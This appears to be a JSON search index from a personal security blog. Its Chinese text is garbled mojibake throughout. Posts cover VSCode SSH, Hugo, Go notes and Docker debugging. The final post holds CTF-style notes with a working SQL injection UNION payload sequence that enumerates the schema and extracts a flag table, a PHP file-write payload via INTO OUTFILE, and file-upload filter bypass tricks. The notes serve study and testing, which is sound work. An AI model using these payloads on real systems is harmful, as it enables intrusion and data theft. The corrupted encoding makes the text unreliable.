å®‰è£…ï¼Œwindowsæ‰“å¼€è®¾ç½®ï¼Œæ‰¾åˆ°åº”ç”¨å’ŒåŠŸèƒ½ï¼Œåœ¨å¯é€‰åŠŸèƒ½ä¸­æ‰¾åˆ° Openssh æœåŠ¡ç«¯ å’Œ å®¢æˆ·ç«¯ è¿œç«¯ä¸€å®šå®‰è£…æœåŠ¡ç«¯ï¼Œæœ¬åœ°ç«¯ä¸€å®šå®‰è£…å®¢æˆ·ç«¯ï¼ˆå¥½åƒæœåŠ¡ç«¯å’Œå®¢æˆ·ç«¯åˆå¹¶äº†ï¼Ÿï¼‰ ç„¶åå¼€å¯sshæœåŠ¡å¼€æœºè‡ªå¯ï¼Œä¸¤ç«¯å‡éœ€è¦\nä¾æ¬¡ç‚¹å‡»ï¼šå¼€å§‹èœå• \u0026ndash; Windows Administrative Tools \u0026mdash; Servicesï¼Œæ‰“å¼€ Services çª—å£ åœ¨é‡Œé¢æ‰¾åˆ° OpenSSH Authentication Agentï¼Œåœ¨ä¸Šé¢å•å‡»å³é”®ï¼Œé€‰æ‹©â€œå±æ€§â€ï¼Œå°† Startup type æ”¹ä¸º Automatic ã€Automatic(Delayed Start) æˆ– Manualï¼Œå¹¶ç‚¹å‡» Service status ä¸‹çš„ Start æŒ‰é’®ã€‚\nç„¶åæµ‹è¯•sshè¿æ¥ssh ç”¨æˆ·å@IP å¦‚æœå‡ºç°è¾“å…¥å¯†ç ç•Œé¢ï¼Œå³å®Œæˆ\nä¸ºæ–¹ä¾¿åç»­vscodeä½¿ç”¨ï¼Œå¯ä»¥è®¾ç½®å…¬ç§é’¥è¿æ¥ï¼Œæ•™ç¨‹å¾ˆå¤šï¼Œä½†æ˜¯æœ‰æ³¨æ„äº‹é¡¹\næœåŠ¡ç«¯è¦å¼€å¯ä½¿ç”¨å…¬é’¥è¿æ¥ï¼Œå¹¶ä¸”æ³¨é‡Šæ‰é…ç½®æ–‡ä»¶çš„æœ€åä¸¤è¡Œ å®¢æˆ·ç«¯çš„å…¬é’¥èµ‹å€¼æ·»åŠ åˆ°.ssh/authorized_keysä¸­ï¼Œæ²¡æœ‰åˆ›å»ºï¼Œæœ‰çš„è¯è¿½åŠ  ä¸ºäº†å®‰å…¨èµ·è§ï¼Œæœ€å¥½å…³é—­å¯†ç ç™»å½• è®°å¾—ä¿®æ”¹å®¢æˆ·ç«¯çš„é…ç½®æ–‡ä»¶ï¼ŒæŒ‡å®šç§é’¥è·¯å¾„ ä¹‹åä½¿ç”¨vscodeçš„sshè¿æ¥ç›´æ¥è¿æ¥å³å¯\n","date":"2024-03-06T17:38:40+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240306174015000.png","permalink":"https://d4n-sec.github.io/p/vscode/","title":"Vscode Windows è¿œç¨‹è¿æ¥"},{"content":"å‰è¨€ Hugo æ­å»ºå…¶å®å’Œhexoå·®ä¸å¤šï¼Œä½†æ˜¯ä»‹äºä½œè€…æœ‰å¹¸å°è¯•è¿‡hexoç¼–è¯‘å¤§é‡æ–‡ç« çš„ç»å†ï¼Œå¯ä»¥è¯´hexoçš„æ€§èƒ½å·²ç»æ— æ³•æ»¡è¶³æˆ‘å¯¹ä¸ªäººåšå®¢çš„å‘å¾€ï¼Œäºæ˜¯ä¹è½¬Hugoï¼ŒHugo åŸºäºGoå¼€å‘ï¼Œæ•ˆç‡æ–¹é¢æ¯‹åº¸ç½®ç–‘ï¼Œä½†æ˜¯ç”±äºè¯¥å·¥å…·å‡ºç°æ—¶é—´çŸ­æš‚ï¼Œç›®å‰å‚è€ƒèµ„æ–™å°‘ï¼Œæ‰€ä»¥ç¬”è€…åœ¨è¿™é€šè¿‡æ­å»ºåšä¸€äº›æ€»ç»“\nHugo å®‰è£… Hugo ä¸‹è½½ Hugo çš„ github ä¸»é¡µæ‰¾åˆ°Releasesï¼Œæ ¹æ®ä¸ªäººå–œå¥½å®‰è£…Hugoå¯¹åº”ç‰ˆæœ¬ï¼Œå»ºè®® hugo_extended ç‰ˆæœ¬çš„å®‰è£…ï¼Œæœ‰é¢å¤–åŠŸèƒ½ï¼ˆè™½ç„¶è¯»è€…å¯èƒ½æ ¹æœ¬ç”¨ä¸ä¸Šï¼‰ï¼Œä½†å› ç¬”è€…å®‰è£…ä½¿ç”¨æ­¤ï¼Œå›ºæ¨èï¼Œå…·ä½“å¼‚åŒå¯ä»¥å‚è€ƒè¿™ä¸ªIssues\nHugo å®‰è£… å®‰è£…æ—¶é€‰æ‹©ä»»æ„æ–‡ä»¶å¤¹ï¼Œä½†åŸºäºç¨‹åºå‘˜çš„ä¸¥è°¨ï¼Œä¸å»ºè®®å®‰è£…åœ¨å«æœ‰ä¸­æ–‡çš„è·¯å¾„ä¸Šã€‚ä¹‹åè¯»è€…éœ€è‡ªè¡Œé…ç½®å®‰è£…è·¯å¾„åˆ°ç³»ç»Ÿå˜é‡ï¼ˆPathï¼‰ä¸­ï¼Œå¦‚æœcmdä¸­Hugo å‘½ä»¤æˆåŠŸè¯†åˆ«ï¼Œæ­¤æ­¥å³å®Œæˆ\n1 2 PS D:\\Home\\Hugo_Blog\u0026gt; hugo version hugo v0.123.7-312735366b20d64bd61bff8627f593749f86c964+extended windows/amd64 BuildDate=2024-03-01T16:16:06Z VendorInfo=gohugoio Hugo test å‚ç…§å®˜æ–¹startæ–‡æ¡£é€æ­¥æ“ä½œï¼Œå³å¯åˆè§æˆæ•ˆï¼Œå»ºè®®è¯»è€…å°è¯•è·Ÿè¸ªæ“ä½œï¼Œæ–¹ä¾¿åç»­ç†è§£\nHugo ç›®å½•ç»“æ„ç†è§£ 1 2 3 4 5 6 7 8 9 10 11 . â”œâ”€archetypes â”œâ”€assets â”œâ”€content â”œâ”€data â”œâ”€i18n â”œâ”€layouts â”œâ”€public â”œâ”€resources â”œâ”€static â””â”€themes æœ‰æ–‡ç« å†™çš„ä¸é”™ï¼Œç¬”è€…å·æ‡’ï¼š\narchetypes ç›®å½• é»˜è®¤ï¼Œé€šè¿‡ hugo new åˆ›å»ºçš„å†…å®¹ä¼šæ·»åŠ  date, title, draft = true ç­‰æ‰‰é¡µ front matter è®¾ç½®ä¿¡æ¯ï¼Œå®ƒä»¬å°±æ˜¯ä»archetypes æ¨¡æ¿æ–‡ä»¶ä¸­æ‹·è´çš„ã€‚è¿™å¯ä»¥èŠ‚çœæ—¶é—´ï¼ŒåŒæ—¶ä¿è¯ç»Ÿä¸€æ€§ã€‚\næ‹“å±•ï¼š Hugoä¸­çš„mdæ–‡ä»¶åˆ†ä¸ºä¸¤ç§ç±»å‹ï¼Œç®€å•çš„æ–‡ç« mdæ–‡ä»¶å’Œpageé¡µé¢mdæ–‡ä»¶ï¼Œåœ¨è¯»è€…ä½¿ç”¨ä¸­éå¼ºéœ€æ±‚è‡ªå®šä¹‰ç¾åŒ–è€…ï¼Œå¦åˆ™ä¸éœ€è¦å»ç†è§£pageé¡µé¢ï¼Œä½¿ç”¨themeè‡ªå¸¦çš„å³å¯\nç®€å•ç†è§£å³æ˜¯æ‰§è¡Œhugo new post/test.mdæ—¶ï¼Œæ–°åˆ›å»ºæ–‡ç« çš„åŸºæœ¬æ¨¡ç‰ˆæ˜¯å‚ç…§ archetypes ç›®å½•ä¸‹çš„ defult.md å¦‚æœå¯¹åç»­æœ‰æ›´æ”¹é»˜è®¤åˆ›å»ºæ–‡ä»¶çš„è¯»è€…å¯ä»¥æ‰“å¼€defult.mdå°è¯•ç†è§£å¦‚ä½•ä½¿ç”¨\nassets ç›®å½• ä¸æ˜¯é»˜è®¤åˆ›å»ºçš„èµ„æºç›®å½•ï¼Œä¿å­˜æ‰€æœ‰éœ€è¦é€šè¿‡ Hugo Pipes å¤„ç†çš„èµ„æºï¼Œåªæœ‰é‚£äº› .Permalink å’Œ .RelPermalink å¼•ç”¨çš„æ–‡ä»¶ä¼šå‘å¸ƒåˆ° public ç›®å½•ä¸­ï¼Œå‚è€ƒ Hugo ç®¡é“å¤„ç†ã€‚\né»˜è®¤å³å¯ï¼Œæ— éœ€è¿‡å¤šåœ¨æ„\ncontent ç›®å½• æ‰€æœ‰å†…å®¹é¡µé¢å­˜æ”¾ç›®å½•ï¼Œcontent ä¸‹çš„ä¸€çº§å­ç›®å½•çœ‹ä½œä¸€ä¸ªå¯¹åº”çš„ section å†…å®¹åˆ†ç±»åŒº content sectionã€‚æ¯”å¦‚ï¼Œä¸ºåšå®¢è®¾ç½®ä¸€ä¸ª blog ç›®å½•ï¼Œä¸ºæ–‡ç« è®¾ç½®ä¸€ä¸ª articles ç›®å½•ï¼Œä¸ºæ•™ç¨‹è®¾ç½®ä¸€ä¸ª tutorials ç›®å½•ç­‰ï¼ŒHugo ä½¿ç”¨å†…å®¹åˆ†ç±»åŒºåˆ†ä½œä¸ºé»˜è®¤å†…å®¹ç±»å‹ content typeï¼Œå¦‚æœåœ¨æ‰‰é¡µ front matter è®¾ç½®äº† type åˆ™ä»¥å…·ä½“è®¾ç½®çš„ç±»å‹ä¸ºå‡†ã€‚\nè¯¥ç›®å½•ä¸­çš„postç›®å½•å³ä¸ºä¹‹åæ–‡ç« å­˜æ”¾åœ°å€ï¼Œcontent/postä¸‹å¯ä»¥å­˜åœ¨å­ç›®å½•ï¼Œå¯¹Hugoæ¸²æŸ“ä¸äº§ç”Ÿå¤§çš„å½±å“\nlayouts ç›®å½• å¸ƒå±€æ¨¡æ¿æ–‡ä»¶ç›®å½•ï¼Œå­˜æ”¾ .html å¸ƒå±€æ¨¡æ¿æ–‡ä»¶ï¼Œå¯¹åº”ä¸åŒçš„å†…å®¹ï¼Œæ¨¡æ¿æœ‰å¤šç§ï¼Œdata-templatesã€homepageã€listsã€menu-templatesã€partialsã€section-templates ç­‰ç­‰ã€‚\nç«™ç‚¹çš„é¦–é¡µæ¨¡æ¿åœ¨ä¸»é¢˜ç›®å½•ä¸­ layouts/index.htmlï¼Œé™¤é¦–é¡µå¤–ï¼ŒHugo æœ‰ä¸¤ç±»åŸºæœ¬é¡µé¢ï¼š Single page å•ä½“é¡µé¢ï¼Œå¦‚ hugo new demo.md åˆ›å»ºçš„ Post é¡µé¢ï¼› List page åˆ—è¡¨é¡µé¢ï¼Œå¦‚ tags æˆ– categories é¡µé¢ï¼› è¿™ä¸¤ç§é¡µé¢çš„é»˜è®¤æ¨¡æ¿éƒ½åœ¨ä¸»é¢˜ç›®å½•ä¸­ layouts/_defaultï¼Œåˆ†åˆ«å¯¹åº”ç€ single.html å’Œ list.htmlã€‚å‚è€ƒå•é¡µé¢å†…å®¹æ¨¡æ¿ single-page-templates.\u0026gt; md å’Œ lists.md æ–‡æ¡£ã€‚\næ­¤ç›®å½•ä¸dataç›®å½•ï¼Œstaticç›®å½•ä¸€æ ·ï¼Œè‹¥éåˆæ¬¡ä½¿ç”¨æ—¶æ— éœ€ç†è§£\npublic ç›®å½• é»˜è®¤è¾“å‡ºç›®å½•ï¼Œå¯ä»¥é€šè¿‡ -d å‚æ•°ä¿®æ”¹è¾“å‡ºè·¯å¾„\ntheme ç›®å½• ç”¨äºå­˜æ”¾ä¸»é¢˜æ–‡ä»¶çš„ç›®å½•ï¼Œä¸”ä¸»é¢˜æ–‡ä»¶åä¸é…ç½®æ–‡ä»¶ä½¿ç”¨ä¸»é¢˜ç›¸å…³\nconfig ç›®å½• configç›®å½•æ ¹æ®hugoåˆ›å»ºçš„æµç¨‹ä¸åŒï¼Œæœ‰äº›è¯»è€…æœ‰æœ‰äº›è¯»è€…æ²¡æœ‰ï¼Œä¸è¿‡æœ¬è´¨åªæ˜¯æŠŠæœ¬åº”è¯¥å¤„äº theme ç›®å½•ä¸­çš„config.yaml æ‹†å¼€æ”¾å…¥ configç›®å½•ä¸‹ï¼ŒæŒ‰ç…§è®¾ç½®ç±»å‹åˆ†ç±»\né»˜è®¤æ ¹ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶åœ¨Hugoæ—©æœŸæ˜¯config.tomlæ–‡ä»¶ï¼ˆconfig.yamlä¹Ÿå¯ä»¥ Hugoæ”¯æŒå¤šç§æ–‡ä»¶ç±»å‹ï¼‰ç°åœ¨ç»Ÿä¸€æ”¹ä¸ºäº†hugo.toml(hugo.yaml)\nHugo ä¸»é¢˜ æ·±åº¦è‡ªå®šä¹‰æ‚£è€…éœ€è¦ä½¿ç”¨é…·ç‚«çš„ä¸»é¢˜ï¼Œæœ‰å¤šç§æ–¹å¼ä¸‹è½½ä¸å®‰è£…Themeï¼Œç†è§£æœ¬è´¨å…¶å®å¹¶ä¸å¤æ‚ï¼ˆç¬”è€…çš„ä¸»é¢˜ä¸ºStackï¼Œä»¥æ­¤ä¸ºåŸºç¡€é˜è¿°ï¼Œè‹¥éç‰¹åˆ«è¯´æ˜å‡ä¸ºé€šç”¨ï¼‰\nä¸‹è½½æ–¹å¼å¤šç§ï¼Œgit clone | git submoudle | æ‰‹åŠ¨ä¸‹è½½ å‡å¯ï¼Œå°†ä¸‹è½½çš„å‹ç¼©åŒ…æ”¾å…¥themeç›®å½•ä¸‹ï¼Œè§£å‹ï¼ˆæ³¨æ„ï¼Œå¦‚ä¸»é¢˜åä¸ºaaa,åˆ™theme/aaaç›®å½•ä¸‹åº”æœ‰ config.yamlï¼‰ å®‰è£…ï¼Œåœ¨ä¸»é¢˜æ ¹ç›®å½•ä¸‹çš„hugo.tomlä¸­æ·»åŠ theme = 'ä¸»é¢˜æ–‡ä»¶å¤¹å'å³å¯å®Œæˆé…ç½®ï¼Œæ­¤æ—¶é…ç½®å®Œæ¯•ï¼Œä¸»é¢˜å·²æ›´æ¢ ä¹‹åå¯ä»¥hugo serveråœ¨æœ¬åœ°ç«¯æŸ¥çœ‹åšå®¢ç›®å‰çš„æƒ…å†µï¼Œå¹¶ä¸”å¯ä»¥åœ¨ä¸å…³é—­æœ¬åœ°æœåŠ¡ç«¯çš„æƒ…å†µä¸‹ç¼–è¾‘åšå®¢ï¼Œå®æ—¶æŸ¥çœ‹åšå®¢æƒ…å†µ\næ³¨æ„ï¼š hugo new å‡ºæ¥çš„åšå®¢é»˜è®¤å¯èƒ½ä¸å±•ç¤ºï¼Œå»ºè®®åœ¨æ–°æ–‡ä»¶å¤´ä¸­åŠ å…¥æˆ–è€…ä¿®æ”¹å­—æ®µdraftå€¼ä¸ºfalseï¼Œå³å¯å‡ºç°\nï¼ˆè¯»è€…å¦‚æœæ²¡æœ‰éšè—æ–‡ç« çš„è®¡åˆ’ï¼Œå¯ä»¥å°è¯•ä¿®æ”¹ archetypes ç›®å½•ä¸­çš„defult.mdæ–‡ä»¶ä¸­ç›¸åº”å­—æ®µå€¼ï¼Œä¿®æ”¹é»˜è®¤æ¨¡ç‰ˆï¼‰\n","date":"2024-03-06T16:26:40+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/image-20240306162853109.png","permalink":"https://d4n-sec.github.io/p/blogtohugo/","title":"BlogToHugo"},{"content":"Goå­¦ä¹ éš¾ç‚¹è®°å½•ä¸è§£å†³ï¼ˆå¸Œæœ›èƒ½è§£å†³ï¼‰\næ··æ·†ç‚¹ 1.Goçš„åŒ…å¯¼å…¥\nå¯¼å…¥æœ¬è´¨ï¼Œå¯¼å…¥é¡ºåºï¼Œä¾èµ–é¡ºåºä»¥åŠå¯¼å…¥ä¼˜å…ˆçº§ï¼Œé»˜è®¤è·¯å¾„ï¼Œä¸ºä»€ä¹ˆæ˜¯è¿™ä¸ªé»˜è®¤è·¯å¾„ï¼Œå¦‚ä½•ç»“åˆé»˜è®¤è·¯å¾„è®¾è®¡é¡¹ç›®ç»“æ„\nä¸”åŒä¸€ç›®å½•ä¸‹çš„æ‰€æœ‰.goæ–‡ä»¶å¿…é¡»åŒå±äºä¸€ä¸ªpackage\n2.åŸºæœ¬ç±»å‹å’Œæ•°ç»„ä¼ å‚æ˜¯ä¼ å€¼ï¼ˆå€¼å¤åˆ¶ï¼‰ï¼ˆå¾…éªŒè¯æ•°ç»„ï¼‰\n3.å‡½æ•°ä¼ å‚ä¼ åœ°å€å¦‚ä½•ä½¿ç”¨ï¼ˆä¼ åœ°å€å€¼ï¼Œä¼ å¼•ç”¨ï¼‰å¦‚ä½•ä½¿ç”¨\n4.è‡ªå®šä¹‰æ•°æ®ç±»å‹ï¼ˆç»™ç±»å‹èµ·åˆ«åä½†æ˜¯ä¸¥æ ¼åŒºåˆ†ï¼‰çš„æ„ä¹‰ä½•åœ¨ï¼Œä½¿ç”¨åœºæ™¯\n5.åŒ¿åå‡½æ•°å¸¸ç”¨å½¢å¼ï¼š\nå…¨ç¨‹åºè°ƒç”¨æœ¬æ–‡ä»¶çš„åŒ¿åå‡½æ•°å¦‚ä½•å¤„ç†ï¼šå°†åŒ¿åå‡½æ•°èµ‹å€¼ç»™å…¨å±€å˜é‡å³å¯\n6.é—­åŒ…ä½¿ç”¨çš„å†…å­˜å›¾è§£ï¼Œé—­åŒ…çš„ä½¿ç”¨åœºæ™¯å’Œå¦™ç”¨\n7.defer å…³é”®å­—çš„ä½¿ç”¨åœºæ™¯ å¦™ç”¨ï¼Ÿ\n8.strings.TrimSpace(\u0026quot;\u0026quot;)å¤„ç†å»æ‰äº†å·¦å³ä¸¤è¾¹çš„ç©ºæ ¼ï¼Œä¼šå»æ‰å­—ç¬¦ä¸²ç»“å°¾çš„\\nå—ï¼Ÿ\n9.æ•°ç»„åˆå§‹åŒ–\nä¸€ç»´\näºŒç»´\näºŒç»´æ•°ç»„éå†\ntips 1.æœ¬åœ°ä¿å­˜é¡µé¢è·¯å¾„D:\\Program Files (Green)\\JJDown\\Download\n2.å‡½æ•° retrun æ”¯æŒåœ¨è¿”å›ç±»å‹å£°æ˜å¤„å®šä¹‰è¿”å›å˜é‡å\n3.å…¨å±€å˜é‡åˆå§‹åŒ–\u0026gt;initå‡½æ•°\u0026gt;mainå‡½æ•° è¢«å¯¼åŒ…æ–‡ä»¶init\u0026gt;å¯¼åŒ…æ–‡ä»¶ ä¸”è¢«å¯¼åŒ…æ·±åº¦ä¼˜å…ˆ\n","date":"2024-03-06T14:45:23+08:00","image":"https://d4n-picture-database.oss-cn-beijing.aliyuncs.com/img/OIP-C.jpg","permalink":"https://d4n-sec.github.io/p/go-study/","title":"Go Study"},{"content":"æœ¬æ–‡è®°å½•VScode Docker Python Debug ç›¸å…³è®¾ç½®å·²ç»é‡è§çš„é—®é¢˜\nä¸ºä½• æ—¥ç›Šå¢å¤šçš„æ¡†æ¶å’Œæ¼æ´å­¦ä¹ ä¸­ï¼ŒVulDBä¸€é”®æ­å»ºæˆä¸ºå®‰å…¨ç ”ç©¶ç¦éŸ³ã€‚ä¸ºæ›´å¥½åœ°è·Ÿè¸ªPayloadåˆ©ç”¨è·¯å¾„ï¼Œè°ƒè¯•æˆä¸ºå¿…ä¸å¯å°‘çš„ä¸€æ­¥ï¼Œä½†VulDBä»¥Dockerä¸ºåŸºçŸ³ï¼Œéšä¹‹è€Œæ¥åªèƒ½é€‰æ‹©éæœ¬åœ°æ­å»ºè€Œä½¿ç”¨ç°æœ‰çš„Dockerè¿›è¡Œè¿œç¨‹è°ƒè¯•ï¼Œæœ¬æ–‡è®°å½•VScode Docker Python Debug ç›¸å…³è®¾ç½®å·²ç»é‡è§çš„é—®é¢˜\nå‰æ æœ‰ä¸æœ¬åœ°äº’é€šçš„Dockerç¯å¢ƒ\nVulDBæºç å·²å®‰è£…\næ­£å¸¸çš„é€»è¾‘æ€ç»´ï¼ŒåŠ¨æ‰‹èƒ½åŠ›ï¼Œè§‚å¯Ÿèƒ½åŠ›ä»¥åŠä¿¡æ¯æœé›†èƒ½åŠ›\nç¬”è€…ç¯å¢ƒ Windows10å®¶åº­ç‰ˆ WSL2 + Docker Desktop VScode\nè®°å½• VScodeæ­£å¸¸å®‰è£…ï¼ŒDocker å‚ç…§VulDBæ­£å¸¸å¯åŠ¨åï¼ŒVScodeæœ¬åœ°å®‰è£… Remote Development æ’ä»¶åŒ…ï¼ˆèµ·ä½œç”¨çš„æ˜¯Dev Containersï¼Œä½†ä½œè€…æœªç ”ç©¶ç›¸å…³æ’ä»¶ä¾èµ–å…³ç³»ï¼Œé‚å»ºè®®å‡å®‰è£…ï¼‰ æŸ¥çœ‹å³ä¾§å‘ç°å‡ºç°æ­¤å›¾æ ‡ç‚¹å‡»å‘ç°æœ‰å·²å¯åŠ¨çš„Dockerç¯å¢ƒ\nå³é”®Filesä¸Šä¸€æ ï¼ˆå¦‚å›¾ï¼‰åç‚¹å‡»Attach Visual Dtudio Code å¦èµ·ä¸€ä¸ªçª—å£\nåç­‰å¾…VScodeå®‰è£…Serverç«¯ï¼Œç­‰å¾…å¯åŠ¨ä¾¿å¯\nDockerç«¯ï¼ˆåè¿°ä¸ºè¿œç«¯ï¼‰éœ€å®‰è£…æ’ä»¶å¦‚ä¸‹ï¼ˆé™¤çº¢æ¡†å¤–å…¶ä»–æ’ä»¶å¹¶éç¬”è€…ä¸»åŠ¨å®‰è£…ï¼‰\næ³¨ï¼špythonæ–°ç‰ˆæœ¬æ’ä»¶ Python ä¸æ”¯æŒ3.7ç‰ˆæœ¬ä»¥ä¸‹çš„pythonï¼Œéœ€è¦æŒ‡å®šå®‰è£…æ—§ç‰ˆæœ¬ï¼Œå®æµ‹æ’ä»¶ç‰ˆæœ¬ä¸º2022.6.0ç‰ˆæœ¬æ”¯æŒ python 3.6 debug\npythonç‰ˆæœ¬ç¡®è®¤ å³ä¸‹è§’æŸ¥çœ‹Pythonç¯å¢ƒå‘ç°å‡ºç°ä¸çŸ¥ä¸€ä¸ª\nåˆ©ç”¨å„ç§æ–¹æ³•ç¡®è®¤å½“å‰Dockerå¯åŠ¨æ—¶ä½¿ç”¨å“ªä¸ªç‰ˆæœ¬çš„Python æ–¹æ¡ˆ 0 ï¼šè¿›å…¥Terminalï¼Œpython è¿è¡Œä¸´æ—¶ç¯å¢ƒï¼Œimport é¡¹ç›®æ‰©å±•åŒ…ï¼ˆé¡¹ç›®ä½¿ç”¨ä½†éåŸºç¡€ç¯å¢ƒï¼‰ï¼Œå¦‚æœå¯¼å…¥å¤±è´¥å³å¯æ’é™¤è¯¥ç‰ˆæœ¬\nåœ¨å‡†å¤‡å¥½åï¼Œåˆ‡æ¢åˆ°é¡¹ç›®éœ€æ±‚çš„pythonç‰ˆæœ¬åç‚¹å‡»Debugæ¨¡å—ï¼Œåˆ›å»ºlaunch.json\næ— å¯åŠ¨ç‰¹æ®Šè®¾ç½®çš„è¯ï¼ˆå¯åŠ¨è„šæœ¬ä¸ä¸»è¦ç¼–å†™è„šæœ¬ä¸ä¸€è‡´ï¼Œéœ€è¦å¸¦å‚è¿è¡Œï¼‰ä½¿ç”¨é»˜è®¤å³å¯ï¼Œå¦‚éœ€è®¾ç½®è‡ªè¡Œç™¾åº¦\næ‰“ä¸Šæ–­ç‚¹åå°è¯•è¿è¡ŒåŸºæœ¬è„šæœ¬æµ‹è¯•\nèƒ½æ–­ä»£è¡¨è®¾ç½®æˆåŠŸ\né—®é¢˜ä»¥åŠè§£å†³ é—®é¢˜ åœ¨è°ƒè¯•æ—¶å‘ç°æ¡†æ¶å‡½æ•°æ— æ³•å¦‚æœ¬åœ°ä¸€æ ·è¿›å…¥æŸ¥çœ‹ç»†èŠ‚\nè§£å†³ åœ¨ç¡®è®¤ä½¿ç”¨pythonç‰ˆæœ¬å·çš„å‰æä¸‹ï¼Œä½¿ç”¨è¯¥ç‰ˆæœ¬pythonå…¨è·¯å¾„è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼š\npython -c \u0026quot;import site;print(site.getusersitepackages())\u0026quot;\nç¡®è®¤é¡¹ç›®æ‰©å±•åŒ…ä½ç½®ï¼Œç¬”è€…å¦‚å›¾\nåœ¨è¿œç«¯è®¾ç½®ï¼ˆsetting.jsonï¼‰ä¸­ï¼ˆuseræˆ–è€…WorkSpaceå‡å¯ï¼‰è®¾ç½®å¦‚ä¸‹å­—æ®µåï¼Œå†æ¬¡å°è¯•Debug\nè¿›å…¥å‡½æ•°å¤±è´¥ï¼Œå³ä¸‹è§’æç¤º\nlaunch.json ä¸­è®¾ç½®ç›¸å…³å­—æ®µï¼Œå¦‚ä¸‹å›¾\nå†æ¬¡å°è¯•ï¼ŒæˆåŠŸè¿›å…¥æ¡†æ¶å‡½æ•°ï¼Œä½†ä¾æ—§æ— æ³•ä¸»åŠ¨ç‚¹å‡»è¿›å…¥ï¼Œæ­¤æ—¶æ›´æ¢è¯¥æ’ä»¶ç‰ˆæœ¬ï¼Œä¸Pythonæ’ä»¶å¯¹åº”ï¼Œå³å¯ï¼ˆç¬”è€…åŒæ ·ä½¿ç”¨2022.6.0ï¼‰\n","date":"2024-01-09T00:00:00Z","permalink":"https://d4n-sec.github.io/p/vscode-docker-python-debug%E5%AE%89%E8%A3%85%E6%8C%87%E5%8D%97/","title":"VScode+Docker+Python+Debugå®‰è£…æŒ‡å—"},{"content":"ä¸€äº›è¯¦ç»†çŸ¥è¯†ç‚¹çš„å¤‡å¿˜\nSQLæ³¨å…¥ 1.floorç±»å‹æŠ¥é”™æ³¨å…¥ï¼ŒåŸç†æ˜¯ group by å’Œ random()ç›¸é‡æ—¶ï¼Œgroup byçš„è¿è¡Œæ–¹å¼å‘ç”Ÿå˜åŒ–ï¼Œä¼šä¸¤æ¬¡æŸ¥è¯¢ï¼Œç¬¬ä¸€æ¬¡æŸ¥è¯¢åšæ¯”è¾ƒï¼Œå¦‚æœä¸å­˜åœ¨åˆ™å°è¯•æ’å…¥ï¼Œå°†ç¬¬äºŒæ¬¡æŸ¥è¯¢ç»“æœå°è¯•æ’å…¥ï¼Œå› ä¸ºrandomçš„éšæœºæ€§ï¼Œç¬¬äºŒæ¬¡æ’å…¥æ—¶çš„å€¼è¾ƒç¬¬ä¸€æ¬¡å‘ç”Ÿå˜åŒ–ï¼Œå¯¼è‡´ç¬¬äºŒæ¬¡çš„æ’å…¥çš„å€¼å…¶å®å·²ç»å­˜åœ¨ï¼Œæ‰€ä»¥æŠ¥é”™ä¸»é”®å·²å­˜åœ¨\nè¿˜å¯ä»¥è¿›è¡Œçš„æ€è€ƒï¼š\ngroup by ä¸ºä»€ä¹ˆè¦åšè¿™æ ·çš„å˜åŒ–ï¼Œæ ¹æ®ä»€ä¹ˆåˆ¤æ–­ç„¶åé€ æˆçš„å˜åŒ–ï¼Œå“ªäº›å¯ä»¥é€ æˆ group by è¿è¡Œæœºåˆ¶å˜åŒ–\nè”åˆæŸ¥è¯¢payload\n1 2 3 4 5 6 7 8 9 10 11 1\u0026#39; order by 4 #\t#åˆ—æ•°ä¸º4 -1\u0026#39; union select 1,2,3,4 #\t#æŸ¥çœ‹å›æ˜¾ä½ -1\u0026#39; union select 1,database(),3,4 #\t#æŸ¥çœ‹æ•°æ®åº“ -1\u0026#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4 #\t#æŸ¥çœ‹å½“å‰æ•°æ®åº“è¡¨å -1\u0026#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=\u0026#39;flag\u0026#39;),3,4 # #æŸ¥çœ‹flagè¡¨çš„åˆ—å -1\u0026#39; union select 1,(select flag from flag),3,4 # #å¸¦å…¥è¡¨åï¼Œåˆ—åç›´æ¥æŸ¥è¯¢ ç©ºæ ¼ç»•è¿‡\næ³¨é‡Šä»£æ›¿ç©ºæ ¼\n/**/ -\u0026gt; è¯»æ–‡ä»¶å’Œå†™æ–‡ä»¶å‡½æ•°\næ³¨æ„æœ‰ä¸ªé…ç½®éœ€è¦æ‰“å¼€ secure_file_priv=''\nè¯»æ–‡ä»¶ load_file() éœ€è¦çŸ¥é“ç»å¯¹è·¯å¾„\nå†™æ–‡ä»¶ select 1,\u0026lt;?phpinfo();?\u0026gt; into outfile \u0026quot;C:\\\\1.txt\u0026quot;\næ–‡ä»¶ä¸Šä¼  ç»•è¿‡ç±»å‹åˆ†ç™½åå•å’Œé»‘åå•ç»•è¿‡ï¼Œå°è¯•å¤§å°å†™ï¼ŒåŒå†™ï¼Ÿ%00æˆªæ–­ .htaccess .user.ini å›¾ç‰‡é©¬ï¼Œcontent-typeåˆ¤æ–­ä¿®æ”¹\nwindowsç‰¹æ€§ï¼šå¤§å°å†™ä¸æ•æ„Ÿï¼Œæœ«å°¾+ç©ºæ ¼ï¼Œç‰¹æ®Šå­—ç¬¦è‡ªåŠ¨å»æ‰\næœ«å°¾å¸¦.ï¼šç•¸å½¢è§£æï¼Ÿ\n::$DATA ï¼šä¿å­˜æ–‡ä»¶æ—¶å°†åé¢çš„æ•°æ®å½“åšæ–‡ä»¶æµå¤„ç†\n.user.ini\n.user.ini çš„ä½œç”¨èŒƒå›´æ˜¯æœ¬ç›®å½•ï¼Œå­ç›®å½•æ— æ•ˆï¼ˆæµ‹è¯•phpç‰ˆæœ¬ 5.3.29ntsï¼‰ä¸”.user.ini å°±æ˜¯php.iniçš„å½“å‰ç›®å½•ä¸‹çš„ä¸´æ—¶é…ç½®ï¼ˆå†™æ³•è§„åˆ™ä¸€æ ·ï¼‰ï¼Œæ‰€ä»¥ä¼˜å…ˆçº§æ¯”php.inié«˜\nCGIç¨‹åºå°±æ˜¯é…ç½®äº†ç›¸å…³è·¯å¾„ä¿¡æ¯ï¼Œè®¿é—®ç‰¹å®šURLç›®å½•å’ŒæŒ‡å®šæ–‡ä»¶åï¼Œæ ¹æ® Shebang è¡Œæ‰¾åˆ°è§£é‡Šå™¨è°ƒç”¨è§£æå¤„ç†ï¼Œæ ‡å‡†è¾“å‡ºæ¥å…¥åˆ°socket\nApache ä¸­çš„ ScriptAlias /cgi-b/ \u0026ldquo;${SRVROOT}/cgi-bin/\u0026rdquo; 